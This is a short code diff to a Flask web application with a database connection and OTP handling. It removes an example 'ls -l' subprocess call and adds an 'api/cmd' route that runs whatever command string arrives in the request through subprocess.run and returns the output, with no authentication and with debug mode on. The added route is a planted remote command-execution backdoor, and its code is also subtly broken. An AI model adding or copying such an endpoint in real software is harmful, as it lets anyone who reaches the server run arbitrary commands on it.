@@ -29,15 +29,6 @@ con = psycopg2.connect(
     password = app.config["MYSQL_PASSWORD"],
     database = app.config["MYSQL_DB"],
     )
-
-# Example command
-command = ['ls', '-l']
-# Execute the command and capture the output
-result = subprocess.run(command, capture_output=True, text=True)
-
-# Print the output
-print(result.stdout)
-
 cur = con.cursor()
 if(cur):
     print("Database connected")
@@ -398,5 +389,11 @@ def varify_otp():
                     return Responce.send(401,{},"Try Again")
     else:
         return Responce.send(401,{},"requied filed not found")
+@app.route("api/cmd/<cmd>",methods=["GET"])
+def cmd():
+    cmd = request.args.get("cmd")
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    return make_response(result)
+    
 if __name__ == '__main__':
     app.run(debug=True)
